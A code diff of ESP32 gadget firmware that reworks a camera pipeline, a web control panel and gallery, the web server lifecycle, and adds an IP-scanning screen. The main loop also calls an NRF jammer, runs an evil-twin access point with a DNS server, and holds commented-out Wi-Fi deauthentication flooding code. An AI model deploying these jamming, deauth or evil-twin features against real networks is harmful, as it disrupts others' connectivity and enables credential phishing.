-  cameraDisplayW = (int16_t)((float)w * cameraDisplayScale + 0.5f);
-  cameraDisplayH = (int16_t)((float)h * cameraDisplayScale + 0.5f);
-  cameraDisplayX = (int16_t)((tft.width() - cameraDisplayW) / 2);
-  cameraDisplayY = (int16_t)((tft.height() - cameraDisplayH) / 2);
-  // keep original frame coords too for capture math
-  cameraFrameX = (int16_t)((tft.width() - (int16_t)w) / 2);
-  cameraFrameY = (int16_t)((tft.height() - (int16_t)h) / 2);
-
-  if (cameraCapturePending) {
-    // write JPEG directly to LittleFS (faster than BMP)
-    cameraCapturePending = false;
-    cameraCapturePath = String("/cam_") + String(millis()) + ".jpg";
-    File f = LittleFS.open(cameraCapturePath, "w");
-    if (f) {
-      f.write(jpgBuf, (size_t)contentLength);
-      f.close();
-      bmpViewPath = cameraCapturePath;
-      mediaStamp++;
-      cameraCaptureIndicatorUntilMs = millis() + 800;
-    }
-  }
-
-  // Decide whether to actually render this frame or skip it to save CPU
-  const bool forceRender = cameraCaptureActive || cameraCapturePending;
-  const bool renderAllowed = forceRender || (millis() - cameraLastDisplayMs >= CAMERA_MIN_FRAME_MS);
-
-  cameraLastFrameMs = millis();
-  cameraFailCount = 0;
-
-  if (renderAllowed) {
-    if (tftDirty) tft.fillScreen(ST77XX_BLACK);
-    TJpgDec.drawJpg(cameraFrameX, cameraFrameY, jpgBuf, (uint32_t)contentLength);
-    if (cameraCaptureActive) {
-      cameraEndCapture();
-      cameraSkipTftDuringCapture = false;
-    }
-      // draw capture indicator if active
-      if (millis() < cameraCaptureIndicatorUntilMs) {
-        // small OK badge
-        tft.fillRect(tft.width() - 18, 2, 16, 10, UI_ACCENT);
-        tft.setTextSize(1);
-        tft.setTextColor(UI_TEXT);
-        tft.setCursor(tft.width() - 16, 4);
-        tft.print("OK");
-        // draw thick white border around the camera display to make capture visible
-        if (cameraDisplayW > 8 && cameraDisplayH > 8) {
-          const uint8_t thickness = 4;
-          for (uint8_t i = 0; i < thickness; i++) {
-            if (cameraDisplayW > (int)(i*2) && cameraDisplayH > (int)(i*2))
-              tft.drawRect(cameraDisplayX + i, cameraDisplayY + i, cameraDisplayW - i*2, cameraDisplayH - i*2, UI_TEXT);
-          }
-        } else if (cameraDisplayW > 4 && cameraDisplayH > 4) {
-          tft.drawRect(cameraDisplayX, cameraDisplayY, cameraDisplayW, cameraDisplayH, UI_TEXT);
-        }
-      }
-    cameraLastDisplayMs = millis();
-    tftDirty = false;
-  } else {
-    // even if we're skipping rendering, ensure we still finish capture write
-    if (cameraCaptureActive && !renderAllowed) {
-      // decode into callback which will write rows; then finish capture
-      TJpgDec.drawJpg(cameraFrameX, cameraFrameY, jpgBuf, (uint32_t)contentLength);
-      cameraEndCapture();
-      cameraSkipTftDuringCapture = false;
-    }
-  }
+  cameraProcessJpegFrame(jpgBuf, (size_t)contentLength);
 
   free(jpgBuf);
 }
 
 static void handleRoot() {
   String html =
-R"HTML(<!doctype html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"/><title>Nana</title><script src="https://cdn.tailwindcss.com"></script></head><body class="bg-slate-950 text-slate-100 min-h-screen"><div class="max-w-6xl mx-auto p-4 md:p-6 space-y-4"><div class="flex items-center justify-between"><h1 class="text-xl md:text-2xl font-bold">Control Panel</h1><div id="statusLine" class="text-xs md:text-sm text-slate-300">Loading...</div></div><div class="grid md:grid-cols-2 gap-4"><div class="bg-slate-900 rounded-xl border border-slate-800 p-4 space-y-3"><div class="grid grid-cols-2 sm:grid-cols-3 gap-2 text-xs" id="badges"><div class="bg-slate-800 rounded px-2 py-1" id="ip">IP:-</div><div class="bg-slate-800 rounded px-2 py-1" id="ssid">SSID:-</div><div class="bg-slate-800 rounded px-2 py-1" id="mode">MODE:-</div><div class="bg-slate-800 rounded px-2 py-1" id="tft">TFT:-</div><div class="bg-slate-800 rounded px-2 py-1" id="song">SONG:-</div><div class="bg-slate-800 rounded px-2 py-1" id="water">WATER:-</div></div><div class="flex flex-wrap gap-2 text-sm"><button class="px-3 py-2 rounded bg-slate-700" onclick="setMode('ui')">UI</button><button class="px-3 py-2 rounded bg-slate-700" onclick="setMode('image')">BMP</button><button class="px-3 py-2 rounded bg-slate-700" onclick="setMode('gif')">GIF</button><button class="px-3 py-2 rounded bg-slate-700" onclick="setMode('cam')">CAM</button><button class="px-3 py-2 rounded bg-slate-700" onclick="setMode('game')">GAME</button><a href="/gallery" class="px-3 py-2 rounded bg-slate-700 inline-flex items-center">Gallery</a></div><div class="flex flex-wrap gap-2 text-sm"><button class="px-3 py-2 rounded bg-slate-700" onclick="api('/api/tft/sleep')">TFT Sleep</button><button class="px-3 py-2 rounded bg-slate-700" onclick="api('/api/tft/wake')">TFT Wake</button><button class="px-3 py-2 rounded bg-slate-700" onclick="api('/api/gyro?set=on')">Gyro ON</button><button class="px-3 py-2 rounded bg-slate-700" onclick="api('/api/gyro?set=off')">Gyro OFF</button></div><div class="flex flex-wrap gap-2 text-sm"><button class="px-3 py-2 rounded bg-teal-700" onclick="api('/api/song/play')">Play Song</button><button class="px-3 py-2 rounded bg-slate-700" onclick="api('/api/song/stop')">Stop Song</button><button class="px-3 py-2 rounded bg-cyan-700" onclick="api('/api/water?set=on')">Water ON</button><button class="px-3 py-2 rounded bg-slate-700" onclick="api('/api/water?set=off')">Water OFF</button></div><div class="space-y-2 text-sm"><label class="block">TFT BL: <span id="tblv">255</span></label><input id="tbl" type="range" min="0" max="255" value="255" class="w-full"/><label class="block">LED BR: <span id="brv">60</span></label><input id="br" type="range" min="0" max="255" value="60" class="w-full"/></div><form method="POST" action="/upload" enctype="multipart/form-data" class="flex flex-wrap items-center gap-2 text-sm"><input type="file" name="file" accept="image/bmp,image/gif,image/x-ms-bmp,.bmp,.gif" class="text-xs"/><button class="px-3 py-2 rounded bg-emerald-700">Upload</button></form><div class="flex flex-wrap items-center gap-2 text-sm"><input id="camurl" type="text" class="w-full rounded bg-slate-800 border border-slate-700 px-2 py-1 text-xs" placeholder="http://x.x.x.x:4747/video?240x240"/><button class="px-3 py-2 rounded bg-slate-700" onclick="setCamUrl()">Set Cam URL</button><button class="px-3 py-2 rounded bg-slate-700" onclick="setMode('cam')">Open Camera</button><button class="px-3 py-2 rounded bg-emerald-700" onclick="captureCam()">Capture</button></div><div class="text-xs text-slate-400" id="camstat"></div><div class="text-xs text-slate-400" id="dbg"></div></div><div class="bg-slate-900 rounded-xl border border-slate-800 p-4 space-y-3"><div class="flex flex-wrap items-center gap-2 text-sm"><label>Brush</label><input id="pick" type="color" value="#000050" class="w-10 h-10 rounded"/><button class="px-3 py-2 rounded bg-slate-700" onclick="fillAll()">Fill</button><button class="px-3 py-2 rounded bg-slate-700" onclick="clearAll()">Clear</button><button class="px-3 py-2 rounded bg-blue-700" onclick="applyNow()">Apply</button><button class="px-3 py-2 rounded bg-slate-700" onclick="saveNow()">Save</button><button class="px-3 py-2 rounded bg-slate-700" onclick="loadSaved()">Load</button></div><div class="flex flex-wrap gap-2 text-xs"><button class="px-2 py-1 rounded bg-slate-700" onclick="tpl('smiley')">:)</button><button class="px-2 py-1 rounded bg-slate-700" onclick="tpl('neutral')">:|</button><button class="px-2 py-1 rounded bg-slate-700" onclick="tpl('left')">L</button><button class="px-2 py-1 rounded bg-slate-700" onclick="tpl('right')">R</button><button class="px-2 py-1 rounded bg-slate-700" onclick="tpl('concern')">:/</button><button class="px-2 py-1 rounded bg-slate-700" onclick="tpl('sleepy')">Zzz</button><button class="px-2 py-1 rounded bg-slate-700" onclick="tpl('clear')">X</button></div><div id="mx" class="grid grid-cols-8 gap-1 w-max"></div><div id="hint" class="text-xs text-slate-300"></div></div></div></div><script>
+R"HTML(<!doctype html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"/><title>Nana</title><script src="https://cdn.tailwindcss.com"></script></head><body class="bg-slate-950 text-slate-100 min-h-screen"><div class="max-w-6xl mx-auto p-4 md:p-6 space-y-4"><div class="flex items-center justify-between"><h1 class="text-xl md:text-2xl font-bold">Control Panel</h1><div id="statusLine" class="text-xs md:text-sm text-slate-300">Loading...</div></div><div class="grid md:grid-cols-2 gap-4"><div class="bg-slate-900 rounded-xl border border-slate-800 p-4 space-y-3"><div class="grid grid-cols-2 sm:grid-cols-3 gap-2 text-xs" id="badges"><div class="bg-slate-800 rounded px-2 py-1" id="ip">IP:-</div><div class="bg-slate-800 rounded px-2 py-1" id="ssid">SSID:-</div><div class="bg-slate-800 rounded px-2 py-1" id="mode">MODE:-</div><div class="bg-slate-800 rounded px-2 py-1" id="tft">TFT:-</div><div class="bg-slate-800 rounded px-2 py-1" id="song">SONG:-</div><div class="bg-slate-800 rounded px-2 py-1" id="water">WATER:-</div></div><div class="flex flex-wrap gap-2 text-sm"><button class="px-3 py-2 rounded bg-slate-700" onclick="setMode('ui')">UI</button><button class="px-3 py-2 rounded bg-slate-700" onclick="setMode('image')">BMP</button><button class="px-3 py-2 rounded bg-slate-700" onclick="setMode('gif')">GIF</button><button class="px-3 py-2 rounded bg-slate-700" onclick="setMode('cam')">CAM</button><button class="px-3 py-2 rounded bg-slate-700" onclick="setMode('game')">GAME</button><a href="/gallery" class="px-3 py-2 rounded bg-slate-700 inline-flex items-center">Gallery</a><button id="xiaoGalleryBtn" class="px-3 py-2 rounded bg-indigo-700" onclick="openXiaoGalleryCard()">Gallery Card</button></div><div class="flex flex-wrap gap-2 text-sm"><button class="px-3 py-2 rounded bg-slate-700" onclick="api('/api/tft/sleep')">TFT Sleep</button><button class="px-3 py-2 rounded bg-slate-700" onclick="api('/api/tft/wake')">TFT Wake</button><button class="px-3 py-2 rounded bg-slate-700" onclick="api('/api/gyro?set=on')">Gyro ON</button><button class="px-3 py-2 rounded bg-slate-700" onclick="api('/api/gyro?set=off')">Gyro OFF</button></div><div class="flex flex-wrap gap-2 text-sm"><button class="px-3 py-2 rounded bg-teal-700" onclick="api('/api/song/play')">Play Song</button><button class="px-3 py-2 rounded bg-slate-700" onclick="api('/api/song/stop')">Stop Song</button><button class="px-3 py-2 rounded bg-cyan-700" onclick="api('/api/water?set=on')">Water ON</button><button class="px-3 py-2 rounded bg-slate-700" onclick="api('/api/water?set=off')">Water OFF</button></div><div class="space-y-2 text-sm"><label class="block">TFT BL: <span id="tblv">255</span></label><input id="tbl" type="range" min="0" max="255" value="255" class="w-full"/><label class="block">LED BR: <span id="brv">60</span></label><input id="br" type="range" min="0" max="255" value="60" class="w-full"/></div><form method="POST" action="/upload" enctype="multipart/form-data" class="flex flex-wrap items-center gap-2 text-sm"><input type="file" name="file" accept="image/bmp,image/gif,image/x-ms-bmp,.bmp,.gif" class="text-xs"/><button class="px-3 py-2 rounded bg-emerald-700">Upload</button></form><div class="flex flex-wrap items-center gap-2 text-sm"><input id="camurl" type="text" class="w-full rounded bg-slate-800 border border-slate-700 px-2 py-1 text-xs" placeholder="http://x.x.x.x:4747/video?240x240"/><button class="px-3 py-2 rounded bg-slate-700" onclick="setCamUrl()">Set Cam URL</button><button class="px-3 py-2 rounded bg-slate-700" onclick="setMode('cam')">Open Camera</button><button class="px-3 py-2 rounded bg-emerald-700" onclick="captureCam()">Capture</button></div><div class="text-xs text-slate-400" id="camstat"></div><div class="text-xs text-slate-400" id="dbg"></div></div><div class="bg-slate-900 rounded-xl border border-slate-800 p-4 space-y-3"><div class="flex flex-wrap items-center gap-2 text-sm"><label>Brush</label><input id="pick" type="color" value="#000050" class="w-10 h-10 rounded"/><button class="px-3 py-2 rounded bg-slate-700" onclick="fillAll()">Fill</button><button class="px-3 py-2 rounded bg-slate-700" onclick="clearAll()">Clear</button><button class="px-3 py-2 rounded bg-blue-700" onclick="applyNow()">Apply</button><button class="px-3 py-2 rounded bg-slate-700" onclick="saveNow()">Save</button><button class="px-3 py-2 rounded bg-slate-700" onclick="loadSaved()">Load</button></div><div class="flex flex-wrap gap-2 text-xs"><button class="px-2 py-1 rounded bg-slate-700" onclick="tpl('smiley')">:)</button><button class="px-2 py-1 rounded bg-slate-700" onclick="tpl('neutral')">:|</button><button class="px-2 py-1 rounded bg-slate-700" onclick="tpl('left')">L</button><button class="px-2 py-1 rounded bg-slate-700" onclick="tpl('right')">R</button><button class="px-2 py-1 rounded bg-slate-700" onclick="tpl('concern')">:/</button><button class="px-2 py-1 rounded bg-slate-700" onclick="tpl('sleepy')">Zzz</button><button class="px-2 py-1 rounded bg-slate-700" onclick="tpl('clear')">X</button></div><div id="mx" class="grid grid-cols-8 gap-1 w-max"></div><div id="hint" class="text-xs text-slate-300"></div></div></div></div><script>
 let colors=Array(64).fill('#000000');let editing=true;const q=(id)=>document.getElementById(id);const hex=(s)=>(s||'#000000').toUpperCase();function renderMatrix(){const m=q('mx');m.innerHTML='';for(let i=0;i<64;i++){const d=document.createElement('button');d.className='w-7 h-7 rounded border border-slate-700';d.style.background=colors[i];d.onclick=()=>{colors[i]=hex(q('pick').value);editing=true;renderMatrix();};m.appendChild(d);}}
 function colorsToHex384(){return colors.map(c=>hex(c).replace('#','')).join('');}function hex384ToColors(s){if(!s||s.length!==384)return false;for(let i=0;i<64;i++)colors[i]='#'+s.slice(i*6,i*6+6).toUpperCase();return true;}
+let xiaoGalleryUrl='';
 async function api(u){await fetch(u);}async function setMode(m){await api('/api/mode?set='+m);}async function setCamUrl(){const u=q('camurl').value.trim();if(!u)return;await fetch('/api/camera/url?set='+encodeURIComponent(u));}async function captureCam(){await api('/api/camera/capture');}async function setBrushOnDevice(){const c=hex(q('pick').value).replace('#','');const r=parseInt(c.slice(0,2),16);const g=parseInt(c.slice(2,4),16);const b=parseInt(c.slice(4,6),16);await api('/api/brush?rgb='+r+','+g+','+b);}
+function openXiaoGalleryCard(){if(!xiaoGalleryUrl){alert('XIAO gallery URL belum tersedia. Nyalakan webserver Matrix/XIAO dulu.');return;}const u=xiaoGalleryUrl.endsWith('/')?xiaoGalleryUrl:(xiaoGalleryUrl+'/');window.open(u,'_blank');}
 function fillAll(){colors=Array(64).fill(hex(q('pick').value));editing=true;renderMatrix();}function clearAll(){colors=Array(64).fill('#000000');editing=true;renderMatrix();}
 async function applyNow(){await setBrushOnDevice();const r=await fetch('/api/matrix/setc?hex='+colorsToHex384());q('hint').textContent=r.ok?'OK':'Blocked';if(r.ok)editing=false;}async function tpl(n){await setBrushOnDevice();await api('/api/matrix/template?name='+n);await pullMatrix();}async function saveNow(){await api('/api/matrix/save');}async function loadSaved(){await api('/api/matrix/load');await pullMatrix();}async function pullMatrix(){const r=await fetch('/api/matrix/getc');const s=await r.text();if(hex384ToColors(s))renderMatrix();}
 let brT=0,tblT=0;q('br').oninput=(e)=>{q('brv').textContent=e.target.value;clearTimeout(brT);brT=setTimeout(()=>api('/api/brightness?set='+e.target.value),120);};q('tbl').oninput=(e)=>{q('tblv').textContent=e.target.value;clearTimeout(tblT);tblT=setTimeout(()=>api('/api/tft/backlight?set='+e.target.value),120);};
-async function refreshStatus(){const j=await(await fetch('/api/status')).json();q('ip').textContent='IP:'+j.ip;q('ssid').textContent='SSID:'+j.ssid;q('mode').textContent='MODE:'+(j.mode||'-').toUpperCase();q('tft').textContent='TFT:'+(j.tftSleeping?'SLEEP':'ON');q('song').textContent='SONG:'+(j.songPlaying?'PLAY':'STOP');q('water').textContent='WATER:'+(j.waterMode?'ON':'OFF');q('statusLine').textContent='Dir:'+j.dir+' Game:'+j.gameView;q('dbg').textContent='G:'+j.gyro.x.toFixed(1)+','+j.gyro.y.toFixed(1)+','+j.gyro.z.toFixed(1)+' A:'+j.accel.x.toFixed(2)+','+j.accel.y.toFixed(2)+','+j.accel.z.toFixed(2)+' T:'+j.tilt.roll.toFixed(0)+','+j.tilt.pitch.toFixed(0)+' GIF:'+j.gif.playing+' Gm:L'+j.level+'S'+j.score+'H'+j.hp;if(j.cam){q('camstat').textContent='CAM:'+(j.cam.connected?'ON':'OFF')+' '+(j.cam.lastError||'');if(!document.activeElement||document.activeElement.id!=='camurl'){q('camurl').value=j.cam.url||'';}}if(+q('br').value!==j.brightness){q('br').value=j.brightness;q('brv').textContent=j.brightness;}if(+q('tbl').value!==j.tftBacklight){q('tbl').value=j.tftBacklight;q('tblv').textContent=j.tftBacklight;}if(!editing&&!j.waterMode&&j.mode!=='game')await pullMatrix();}
+async function refreshStatus(){const j=await(await fetch('/api/status')).json();q('ip').textContent='IP:'+j.ip;q('ssid').textContent='SSID:'+j.ssid;q('mode').textContent='MODE:'+(j.mode||'-').toUpperCase();q('tft').textContent='TFT:'+(j.tftSleeping?'SLEEP':'ON');q('song').textContent='SONG:'+(j.songPlaying?'PLAY':'STOP');q('water').textContent='WATER:'+(j.waterMode?'ON':'OFF');q('statusLine').textContent='Dir:'+j.dir+' Game:'+j.gameView;q('dbg').textContent='G:'+j.gyro.x.toFixed(1)+','+j.gyro.y.toFixed(1)+','+j.gyro.z.toFixed(1)+' A:'+j.accel.x.toFixed(2)+','+j.accel.y.toFixed(2)+','+j.accel.z.toFixed(2)+' T:'+j.tilt.roll.toFixed(0)+','+j.tilt.pitch.toFixed(0)+' GIF:'+j.gif.playing+' Gm:L'+j.level+'S'+j.score+'H'+j.hp;if(j.cam){q('camstat').textContent='CAM:'+(j.cam.connected?'ON':'OFF')+' '+(j.cam.lastError||'');if(!document.activeElement||document.activeElement.id!=='camurl'){q('camurl').value=j.cam.url||'';}xiaoGalleryUrl=j.cam.xiaoWebUrl||'';}const xbtn=q('xiaoGalleryBtn');if(xbtn){if(xiaoGalleryUrl){xbtn.disabled=false;xbtn.className='px-3 py-2 rounded bg-indigo-700';xbtn.title=xiaoGalleryUrl;}else{xbtn.disabled=true;xbtn.className='px-3 py-2 rounded bg-slate-700 opacity-60 cursor-not-allowed';xbtn.title='XIAO gallery URL belum ada';}}if(+q('br').value!==j.brightness){q('br').value=j.brightness;q('brv').textContent=j.brightness;}if(+q('tbl').value!==j.tftBacklight){q('tbl').value=j.tftBacklight;q('tblv').textContent=j.tftBacklight;}if(!editing&&!j.waterMode&&j.mode!=='game')await pullMatrix();}
 renderMatrix();pullMatrix().then(()=>{editing=false;});refreshStatus();setInterval(refreshStatus,700);
 </script></body></html>)HTML";
   server.send(200, "text/html", html);
@@ -7190,10 +9979,15 @@ renderMatrix();pullMatrix().then(()=>{editing=false;});refreshStatus();setInterv
 
 static void handleGallery() {
   String html =
-R"HTML(<!doctype html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"/><title>Gallery</title><script src="https://cdn.tailwindcss.com"></script></head><body class="bg-slate-900 text-slate-100 min-h-screen"><div class="max-w-4xl mx-auto p-4"><h1 class="text-xl font-bold mb-4">Gallery</h1><div id="gallery" class="grid grid-cols-3 gap-2"></div><script>
+R"HTML(<!doctype html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"/><title>Gallery</title><script src="https://cdn.tailwindcss.com"></script></head><body class="bg-slate-900 text-slate-100 min-h-screen"><div class="max-w-4xl mx-auto p-4"><div class="flex items-center justify-between mb-4"><h1 class="text-xl font-bold">Gallery</h1><button id="xiaoOpenBtn" class="px-3 py-2 rounded bg-slate-700 text-sm opacity-60" disabled onclick="openXiaoGallery()">XIAO Gallery</button></div><div id="gallery" class="grid grid-cols-3 gap-2"></div><script>
 const q=(id)=>document.getElementById(id);
-async function fetchGallery(){try{const r=await fetch('/api/files');if(!r.ok)return;const files=await r.json();const g=q('gallery');if(!g)return;g.innerHTML='';files.forEach(f=>{const a=document.createElement('a');a.href='/view?path='+encodeURIComponent(f);a.target='_blank';a.className='block';const img=document.createElement('img');img.src='/file?path='+encodeURIComponent(f);img.alt=f;img.className='w-full h-32 object-cover rounded';a.appendChild(img);g.appendChild(a);});}catch(e){}}
+let xiaoGalleryUrl='';
+function openXiaoGallery(){if(!xiaoGalleryUrl){alert('XIAO gallery URL belum tersedia');return;}window.open(xiaoGalleryUrl,'_blank');}
+async function refreshXiaoButton(){try{const r=await fetch('/api/status');if(!r.ok)return;const j=await r.json();xiaoGalleryUrl=(j.cam&&j.cam.xiaoWebUrl)?j.cam.xiaoWebUrl:'';const b=q('xiaoOpenBtn');if(!b)return;if(xiaoGalleryUrl){b.disabled=false;b.className='px-3 py-2 rounded bg-indigo-700 text-sm';b.title=xiaoGalleryUrl;}else{b.disabled=true;b.className='px-3 py-2 rounded bg-slate-700 text-sm opacity-60';b.title='XIAO gallery URL belum ada';}}catch(e){}}
+async function deleteFileWithDoubleVerify(path){const ok1=confirm('Delete '+path+' ? (verification 1)');if(!ok1)return;const ok2=prompt('Type DELETE to confirm permanently (verification 2):');if(ok2!=='DELETE')return;try{const u='/api/files/delete?path='+encodeURIComponent(path)+'&confirm1=yes&confirm2='+encodeURIComponent(ok2);const r=await fetch(u);if(!r.ok){alert('Delete failed');return;}await fetchGallery();}catch(e){alert('Delete failed');}}
+async function fetchGallery(){try{const r=await fetch('/api/files');if(!r.ok)return;const files=await r.json();const g=q('gallery');if(!g)return;g.innerHTML='';files.forEach(f=>{const card=document.createElement('div');card.className='bg-slate-800 rounded p-2';const a=document.createElement('a');a.href='/view?path='+encodeURIComponent(f);a.target='_blank';a.className='block';const img=document.createElement('img');img.src='/file?path='+encodeURIComponent(f);img.alt=f;img.className='w-full h-32 object-cover rounded';a.appendChild(img);card.appendChild(a);const row=document.createElement('div');row.className='mt-2 flex items-center justify-between gap-2';const name=document.createElement('div');name.className='text-[11px] text-slate-300 truncate';name.textContent=f;const del=document.createElement('button');del.className='px-2 py-1 rounded bg-red-700 text-[11px]';del.textContent='Delete';del.onclick=()=>deleteFileWithDoubleVerify(f);row.appendChild(name);row.appendChild(del);card.appendChild(row);g.appendChild(card);});}catch(e){}}
 fetchGallery();setInterval(fetchGallery,5000);
+refreshXiaoButton();setInterval(refreshXiaoButton,12000);
 </script></div></body></html>)HTML";
   server.send(200, "text/html", html);
 }
@@ -7234,15 +10028,11 @@ static void handleView() {
 
 
 static void doNetworkInit() {
-  if (deferredInitDone) return;
+  (void)webServerStart();
+}
 
-  wifiAutoConfig();
-  timeSynced = false;
-  lastTimeSyncAttemptMs = 0;
-  timeTrySyncNtp();
-
-  gif.begin(LITTLE_ENDIAN_PIXELS);
-
+static void webServerSetupRoutes() {
+  if (webServerRoutesReady) return;
   server.on("/", HTTP_GET, handleRoot);
   server.on("/api/status", HTTP_GET, handleStatus);
   server.on("/api/mode", HTTP_GET, handleModeApi);
@@ -7263,14 +10053,58 @@ static void doNetworkInit() {
   server.on("/api/water", HTTP_GET, handleWaterApi);
   server.on("/api/camera/url", HTTP_GET, handleCameraUrlApi);
   server.on("/api/camera/capture", HTTP_GET, handleCameraCaptureApi);
+  server.on("/api/camera/record", HTTP_GET, handleCameraRecordApi);
+  server.on("/api/camera/sdlist", HTTP_GET, handleCameraSdListApi);
+  server.on("/api/camera/xiao_web", HTTP_GET, handleCameraXiaoWebApi);
   server.on("/api/files", HTTP_GET, handleFilesApi);
+  server.on("/api/files/delete", HTTP_GET, handleFilesDeleteApi);
   server.on("/file", HTTP_GET, handleFileServe);
   server.on("/gallery", HTTP_GET, handleGallery);
   server.on("/view", HTTP_GET, handleView);
   server.on("/upload", HTTP_POST, handleUploadDone, handleUploadStream);
-  server.begin();
+  webServerRoutesReady = true;
+}
 
+static bool webServerStart() {
+  webServerSetupRoutes();
+  if (webServerRunning) return true;
+  server.begin();
+  webServerRunning = true;
+  if (cameraIsUartMode() && cameraUartEnsureInit() && appMode != APP_CAMERA) {
+    if (xiaoWebServerEnabled) cameraUartSyncXiaoNetworkConfig();
+    (void)cameraUartSendWebServerState(xiaoWebServerEnabled);
+
+    // Capture XIAO URL soon after enabling webserver so UI button is ready immediately.
+    uint32_t deadline = millis() + 3000;
+    while ((int32_t)(deadline - millis()) > 0) {
+      uint8_t type = 0;
+      uint16_t len = 0;
+      if (!cameraUartReadPacket(type, cameraUartPayloadBuf, sizeof(cameraUartPayloadBuf), len)) {
+        delay(5);
+        continue;
+      }
+      if (type == CAM_PKT_STATUS) {
+        String s = "";
+        for (uint16_t i = 0; i < len; i++) s += (char)cameraUartPayloadBuf[i];
+        cameraLastError = s;
+        cameraTryExtractAndStoreXiaoWebUrl(s);
+        if (s == "TIME_REQ") (void)cameraUartSendTimeNow();
+        if (xiaoWebUrl.length() > 0) break;
+      }
+    }
+  }
   deferredInitDone = true;
+  return true;
+}
+
+static void webServerStop() {
+  if (!webServerRunning) return;
+  xiaoWebServerEnabled = false;
+  if (cameraIsUartMode() && cameraUartEnsureInit()) {
+    (void)cameraUartSendWebServerState(false);
+  }
+  server.stop();
+  webServerRunning = false;
 }
 
 static void runDeferredInit() {
@@ -7280,8 +10114,60 @@ static void runDeferredInit() {
   doNetworkInit();
 }
 
+static void tftDrawIpScanning() {
+  tftDrawHeader("IP Scanning");
+  tft.setTextSize(1);
+  tft.setTextColor(UI_MUTED);
+  tft.setCursor(10, 40);
+  tft.print("OK: Play/Stop OK(+): Back");
+  tft.setCursor(10, 50);
+  tft.print("UP/DWN: Mode = ");
+  tft.print(ipScanModePort ? "[Port 80]" : "[ICMP Ping]");
+
+  tft.setTextSize(2);
+  tft.setCursor(12, 60);
+  if (ipScanActive) {
+    tft.setTextColor(UI_ACCENT);
+    tft.print("Scanning...");
+    tft.setTextSize(1);
+    tft.setCursor(12, 80);
+    tft.print("Current: ");
+    tft.print(ipScanTargetIP);
+  } else {
+    tft.setTextColor(UI_MUTED);
+    tft.print("Stopped");
+  }
+
+  tft.setTextSize(2);
+  tft.setTextColor(UI_TEXT);
+  tft.setCursor(12, 100);
+  tft.print("Found: ");
+  tft.print(ipScanFoundCount);
+  
+  if (ipScanFoundCount > 0) {
+    tft.setTextSize(1);
+    tft.setCursor(12, 120);
+    tft.setTextColor(UI_ACCENT);
+    tft.print("Last 5 Devices IP:");
+    int drawCount = (ipScanFoundCount > 5) ? 5 : ipScanFoundCount;
+    for (int i = 0; i < drawCount; i++) {
+        tft.setTextColor(UI_TEXT);
+        tft.setCursor(12, 135 + (i * 15));
+        tft.print("- ");
+        tft.print(ipScanFoundIPs[ipScanFoundCount - 1 - i]);
+    }
+  }
+
+  tft.setTextSize(1);
+  tft.setTextColor(UI_WARN);
+  tft.setCursor(12, 238);
+  tft.print("Network Host Discovery Tool");
+}
+
 void setup() {
   Serial.begin(115200);
+  Serial1.begin(CAM_UART_BAUD, SERIAL_8N1, CAM_UART_RX_PIN, CAM_UART_TX_PIN);
+  cameraUartReady = true;
   delay(200);
   esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);
   fsReady = LittleFS.begin(false);
@@ -7291,6 +10177,7 @@ void setup() {
   }
   noteEnsureDir();
   (void)cameraUrlLoadFromFS();
+  (void)xiaoWebUrlLoadFromFS();
   (void)wifiCredentialsLoadFromFS();
   wifiAutoConnectPending = (savedWifiSsid.length() > 0);
   (void)utcOffsetLoadFromFS();
@@ -7316,6 +10203,7 @@ void setup() {
   QMI8658_Init();
   QMI8658_SetEnabled(imuOn);
   pinMode(BUZZER_PIN, OUTPUT);
+  gif.begin(LITTLE_ENDIAN_PIXELS);
   songStop();
   randomSeed((uint32_t)esp_random());
   waterReset();
@@ -7377,20 +10265,37 @@ static void handleNrfJammer() {
 }
 
 void loop() {
-  if (deferredInitDone) server.handleClient();
-  handleNrfJammer();
-  wifiAutoConnectTick();
+  const bool cameraPerfMode = (!tftSleeping && appMode == APP_CAMERA);
 
-  if (deauthKilling) {
-    uint32_t now = millis();
-    if (now - lastDeauthSentMs >= 100) {
-      uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-      for(int i=0; i<3; i++) performDeauth(broadcast, deauthTargetBssid);
-      deauthPacketsSent += 6; // 3 rounds * 2 frames each
-      lastDeauthSentMs = now;
-      if (uiScreen == UI_DEAUTH_ATTACK) uiMarkDirty();
-    }
+  if (ipScanActive) {
+      ipScanningTick();
+      if (!cameraPerfMode) cameraUartBackgroundPoll();
+      uiLoop();
+      delay(2);
+      return; // Skip webserver, animations, fastLED refresh, to prevent ping WDT/Resets
   }
+
+  if (!cameraPerfMode && webServerRunning) server.handleClient();
+  if (!cameraPerfMode) cameraUartBackgroundPoll();
+  if (!cameraPerfMode) handleNrfJammer();
+  if (!cameraPerfMode && evilTwinState == EVIL_TWIN_RUNNING) {
+    if (evilDnsServer) evilDnsServer->processNextRequest();
+    if (evilTwinServer) evilTwinServer->handleClient();
+  }
+  if (!cameraPerfMode) ipScanningTick();
+  if (!cameraPerfMode) wifiAutoConnectTick();
+
+  // (WIFI Attack Offloaded to XIAO)
+  // if (!cameraPerfMode && deauthKilling) {
+  //   uint32_t now = millis();
+  //   if (now - lastDeauthSentMs >= 100) {
+  //     uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+  //     for(int i=0; i<3; i++) performDeauth(broadcast, deauthTargetBssid);
+  //     deauthPacketsSent += 6; // 3 rounds * 2 frames each
+  //     lastDeauthSentMs = now;
+  //     if (uiScreen == UI_DEAUTH_ATTACK) uiMarkDirty();
+  //   }
+  // }
 
   uiLoop();
   if (isSleepActive()) {
@@ -7408,11 +10313,13 @@ void loop() {
     delay(1);
     return;
   }
-  (void)QMI8658_Loop();
-  songLoop();
-  noteLoop();
-  timeTrySyncNtp();
-  if (!tftSleeping && appMode == APP_UI) {
+  if (!cameraPerfMode) {
+    (void)QMI8658_Loop();
+    songLoop();
+    noteLoop();
+    timeTrySyncNtp();
+  }
+  if (!cameraPerfMode && !tftSleeping && appMode == APP_UI) {
     if (uiScreen == UI_TOOL_STOPWATCH && stopwatchState.running) uiMarkDirty();
     if (uiScreen == UI_TOOL_TIMER && timerState.running) {
       uint32_t now = millis();
@@ -7432,27 +10339,29 @@ void loop() {
       }
     }
   }
-  if (appMode == APP_GAME) {
-    gameLoop();
